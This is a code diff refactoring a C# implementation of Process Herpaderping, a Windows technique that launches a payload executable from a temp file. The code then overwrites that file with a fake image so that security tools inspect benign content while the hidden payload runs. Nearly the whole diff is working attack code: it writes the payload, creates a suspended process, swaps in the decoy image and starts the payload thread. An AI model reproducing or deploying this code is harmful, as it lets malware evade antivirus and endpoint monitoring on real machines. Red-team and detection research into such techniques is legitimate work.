@@ -1,5 +1,4 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.IO;
 using ProcessHerpaderping.Interop;
 
@@ -16,12 +15,11 @@ namespace ProcessHerpaderping.Library
             string windowTitle)
         {
             NTSTATUS ntstatus;
-            bool status;
             IntPtr hTempFile;
-            IntPtr hHerpaderpingProcess;
             IntPtr pPeb;
             IntPtr pEntryPoint;
             IntPtr pRemoteImageBase;
+            IntPtr pParameters;
             string imagePathName;
             string tempFilePath;
             bool is64BitImage;
@@ -29,6 +27,8 @@ namespace ProcessHerpaderping.Library
             uint nAddressOfEntryPoint;
             byte[] fakeImageBytes;
             int nSizeFakeImage;
+            bool status = false;
+            IntPtr hHerpaderpingProcess = IntPtr.Zero;
             int nSizePayload = imageData.Length;
 
             if (Environment.Is64BitProcess && (IntPtr.Size != 8))
@@ -104,157 +104,145 @@ namespace ProcessHerpaderping.Library
                 Console.WriteLine("    This issue will corrupt signature and ruin the advantage of this technique.");
             }
 
-            tempFilePath = Path.GetTempFileName();
-            Console.WriteLine("[>] Trying to create payload file.");
-            Console.WriteLine("    [*] File Path : {0}", tempFilePath);
-
-            hTempFile = Utilities.GetHerpaderpingFileHandle(tempFilePath);
-
-            if (hTempFile == Win32Consts.INVALID_HANDLE_VALUE)
+            do
             {
-                Console.WriteLine("[-] Failed to open temp file.");
-                Helpers.DeleteFile(tempFilePath);
+                tempFilePath = Path.GetTempFileName();
 
-                return false;
-            }
+                Console.WriteLine("[>] Trying to create payload file.");
+                Console.WriteLine("    [*] File Path : {0}", tempFilePath);
 
-            if (!Helpers.WriteDataIntoFile(hTempFile, imageData, false))
-            {
-                Console.WriteLine("[-] Failed to write payload.");
-                NativeMethods.NtClose(hTempFile);
-                Helpers.DeleteFile(tempFilePath);
+                hTempFile = Utilities.GetHerpaderpingFileHandle(tempFilePath);
 
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Payload is written successfully.");
-            }
+                if (hTempFile == Win32Consts.INVALID_HANDLE_VALUE)
+                {
+                    Console.WriteLine("[-] Failed to open temp file.");
+                    break;
+                }
 
-            Console.WriteLine("[>] Trying to create herpaderping process.");
+                if (!Helpers.WriteDataIntoFile(hTempFile, imageData, false))
+                {
+                    Console.WriteLine("[-] Failed to write payload.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Payload is written successfully.");
+                }
 
-            hHerpaderpingProcess = Utilities.CreateSuspendedProcess(hTempFile, ppid);
+                Console.WriteLine("[>] Trying to create herpaderping process.");
 
-            if (hHerpaderpingProcess == IntPtr.Zero)
-            {
-                NativeMethods.NtClose(hTempFile);
-                Helpers.DeleteFile(tempFilePath);
+                hHerpaderpingProcess = Utilities.CreateSuspendedProcess(hTempFile, ppid);
 
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Herpaderping process is created successfully.");
-            }
+                if (hHerpaderpingProcess == IntPtr.Zero)
+                    break;
+                else
+                    Console.WriteLine("[+] Herpaderping process is created successfully.");
 
-            if (!Helpers.GetProcessBasicInformation(
-                hHerpaderpingProcess,
-                out PROCESS_BASIC_INFORMATION pbi))
-            {
-                Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
-                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
-                NativeMethods.NtClose(hTempFile);
-                Helpers.DeleteFile(tempFilePath);
+                if (!Helpers.GetProcessBasicInformation(
+                    hHerpaderpingProcess,
+                    out PROCESS_BASIC_INFORMATION pbi))
+                {
+                    Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
+                    break;
+                }
+                else
+                {
+                    pPeb = pbi.PebBaseAddress;
+                    Console.WriteLine("[+] Got herpaderping process basic information.");
+                    Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
+                    Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
+                }
 
-                return false;
-            }
-            else
-            {
-                pPeb = pbi.PebBaseAddress;
-                Console.WriteLine("[+] Got herpaderping process basic information.");
-                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
-            }
+                pRemoteImageBase = Helpers.GetImageBaseAddress(hHerpaderpingProcess, pPeb);
 
-            pRemoteImageBase = Helpers.GetImageBaseAddress(hHerpaderpingProcess, pPeb);
+                if (pRemoteImageBase == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine(
+                        "[*] Image base address for the herpaderping process is 0x{0}.",
+                        pRemoteImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
+                    pEntryPoint = new IntPtr(pRemoteImageBase.ToInt64() + nAddressOfEntryPoint);
+                }
 
-            if (pRemoteImageBase == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
-                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
-                NativeMethods.NtClose(hTempFile);
-                Helpers.DeleteFile(tempFilePath);
+                Console.WriteLine("[+] Trying to update image file to fake image.");
 
-                return false;
-            }
-            else
-            {
-                pEntryPoint = new IntPtr(pRemoteImageBase.ToInt64() + nAddressOfEntryPoint);
-                Console.WriteLine(
-                    "[*] Image base address for the herpaderping process is 0x{0}.",
-                    pRemoteImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
-            }
+                status = Helpers.WriteDataIntoFile(hTempFile, fakeImageBytes, true);
 
-            Console.WriteLine("[+] Trying to update image file to fake image.");
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to write fake image data.");
+                    break;
+                }
+                else
+                {
+                    Console.WriteLine("[+] Fake image data is written successfully.");
 
-            status = Helpers.WriteDataIntoFile(hTempFile, fakeImageBytes, true);
-            NativeMethods.NtClose(hTempFile);
+                    if (nSizeFakeImage < nSizePayload)
+                        Console.WriteLine("[!] Image file shrinking should be failed.");
+                }
+
+                pParameters = Utilities.SetProcessParameters(
+                    hHerpaderpingProcess,
+                    imagePathName,
+                    commandLine,
+                    Environment.CurrentDirectory,
+                    windowTitle);
+
+                if (pParameters == IntPtr.Zero)
+                {
+                    Console.WriteLine("[-] Failed to set process parameters for the herpaderping process.");
+                    break;
+                }
+
+                Console.WriteLine("[>] Trying to start herpaderping process thread.");
+
+                ntstatus = NativeMethods.NtCreateThreadEx(
+                    out IntPtr hThread,
+                    ACCESS_MASK.THREAD_ALL_ACCESS,
+                    IntPtr.Zero,
+                    hHerpaderpingProcess,
+                    pEntryPoint,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    0,
+                    0,
+                    IntPtr.Zero);
+                status = (ntstatus == Win32Consts.STATUS_SUCCESS);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to create thread.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
+                }
+                else
+                {
+                    Console.WriteLine("[+] Thread is resumed successfully.");
+                    Console.WriteLine("[*] This technique remains payload file. Remove it manually.");
+                    Console.WriteLine("    [*] Payload File Path : {0}", tempFilePath);
+                    NativeMethods.NtClose(hThread);
+                }
+            } while (false);
 
             if (!status)
             {
-                Console.WriteLine("[-] Failed to write fake image data.");
                 NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
                 Helpers.DeleteFile(tempFilePath);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Fake image data is written successfully.");
-
-                if (nSizeFakeImage < nSizePayload)
-                    Console.WriteLine("[!] Image file shrinking should be failed.");
             }
 
-            if (Utilities.SetProcessParameters(
-                hHerpaderpingProcess,
-                imagePathName,
-                commandLine,
-                Environment.CurrentDirectory,
-                windowTitle) == IntPtr.Zero)
-            {
-                Console.WriteLine("[-] Failed to set process parameters for the herpaderping process.");
-                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
-                Helpers.DeleteFile(tempFilePath);
+            if (hHerpaderpingProcess != IntPtr.Zero)
+                NativeMethods.NtClose(hHerpaderpingProcess);
 
-                return false;
-            }
+            if (hTempFile != Win32Consts.INVALID_HANDLE_VALUE)
+                NativeMethods.NtClose(hTempFile);
 
-            Console.WriteLine("[>] Trying to start herpaderping process thread.");
+            Console.WriteLine("[*] Done.");
 
-            ntstatus = NativeMethods.NtCreateThreadEx(
-                out IntPtr hThread,
-                ACCESS_MASK.THREAD_ALL_ACCESS,
-                IntPtr.Zero,
-                hHerpaderpingProcess,
-                pEntryPoint,
-                IntPtr.Zero,
-                false,
-                0,
-                0,
-                0,
-                IntPtr.Zero);
-            NativeMethods.NtClose(hHerpaderpingProcess);
-
-            if (ntstatus != Win32Consts.STATUS_SUCCESS)
-            {
-                Console.WriteLine("[-] Failed to create thread.");
-                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
-                Helpers.DeleteFile(tempFilePath);
-
-                return false;
-            }
-            else
-            {
-                Console.WriteLine("[+] Thread is resumed successfully.");
-            }
-
-            Console.WriteLine("[*] This technique remains payload file. Remove it mannually.");
-            Console.WriteLine("    [*] Payload File Path : {0}", tempFilePath);
-
-            NativeMethods.NtClose(hThread);
-
-            return true;
+            return status;
         }
     }
 }
